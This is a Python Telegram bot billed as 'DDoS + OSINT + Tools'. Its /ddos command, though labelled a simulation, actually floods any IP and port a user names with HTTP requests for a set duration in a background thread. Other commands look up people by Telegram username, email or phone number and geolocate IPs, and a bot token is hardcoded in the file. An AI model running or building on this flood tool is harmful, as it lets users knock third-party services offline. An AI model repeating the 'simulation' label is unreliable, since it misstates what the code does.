import os
import requests
import time
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

API_KEY = "7873607598:AAFnauDKdOQGiaYzb2PIuXe5G65UwCSoCrE"

BANNER = """
🔥 X-BOT FINAL 🔥
Advanced Telegram Bot with DDoS + OSINT + Tools
By: Your Team
"""

# ===================== BASIC COMMANDS =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(BANNER)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
📘 Commands:
/start - Show banner
/help - Show help
/ping - Check if bot is alive
/ddos <ip> <port> <duration> - Simulate DDoS
/userosint <username> - OSINT on Telegram username
/emailosint <email> - OSINT on email address
/phoneosint <phone> - OSINT on phone number
/iplookup <ip> - Lookup IP info
"""
    await update.message.reply_text(help_text)

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅ Bot is online and ready!")

# ===================== DDoS SIMULATION =====================
def ddos_attack(ip, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            requests.get(f"http://{ip}:{port}", timeout=1)
        except:
            pass

async def ddos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /ddos <ip> <port> <duration>")
        return

    ip = context.args[0]
    port = int(context.args[1])
    duration = int(context.args[2])

    thread = threading.Thread(target=ddos_attack, args=(ip, port, duration))
    thread.start()

    await update.message.reply_text(f"🔥 Simulated DDoS attack on {ip}:{port} for {duration} seconds started!")

# ===================== OSINT FEATURES =====================
async def user_osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /userosint <username>")
        return

    username = context.args[0].lstrip('@')
    url = f"https://t.me/{username}"

    try:
        response = requests.get(url)
        if response.status_code == 200:
            result = f"🔍 Username @{username} ditemukan di Telegram.\n📎 Link: {url}"
        else:
            result = f"❌ Username @{username} tidak ditemukan."
    except Exception as e:
        result = f"Error: {str(e)}"

    await update.message.reply_text(result)

async def email_osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /emailosint <email>")
        return

    email = context.args[0]
    hunter_url = f"https://api.hunter.io/v2/email-verifier?email={email}&api_key=demo"

    try:
        response = requests.get(hunter_url)
        data = response.json()
        if 'data' in data:
            result = f"🔍 Email OSINT Result:\n📧 Email: {email}\n✅ Status: {data['data']['status']}"
        else:
            result = "❌ Email not found."
    except Exception as e:
        result = f"Error: {str(e)}"

    await update.message.reply_text(result)

async def phone_osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /phoneosint <phone>")
        return

    phone = context.args[0]
    numverify_url = f"http://apilayer.net/api/validate?access_key=demo&number={phone}&country_code=&format=1"

    try:
        response = requests.get(numverify_url)
        data = response.json()
        if 'valid' in data and data['valid']:
            result = f"📞 Phone OSINT Result:\n🔹 Number: {phone}\n📍 Location: {data['location']}\n📶 Carrier: {data['carrier']}"
        else:
            result = "❌ Invalid phone number."
    except Exception as e:
        result = f"Error: {str(e)}"

    await update.message.reply_text(result)

async def iplookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /iplookup <ip>")
        return

    ip = context.args[0]
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}")
        data = r.json()
        result = (
            f"🌍 IP Lookup Result:\n"
            f"🔹 IP: {ip}\n"
            f"📍 Country: {data['country']}\n"
            f"🏙 City: {data['city']}\n"
            f"🌐 ISP: {data['isp']}\n"
            f"🛰 Lat/Long: {data['lat']}, {data['lon']}"
        )
    except Exception as e:
        result = f"Error: {str(e)}"

    await update.message.reply_text(result)

# ===================== MAIN =====================
def main():
    app = Application.builder().token(API_KEY).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("ping", ping))
    app.add_handler(CommandHandler("ddos", ddos))
    app.add_handler(CommandHandler("userosint", user_osint))
    app.add_handler(CommandHandler("emailosint", email_osint))
    app.add_handler(CommandHandler("phoneosint", phone_osint))
    app.add_handler(CommandHandler("iplookup", iplookup))

    app.run_polling()

if __name__ == '__main__':
    main()
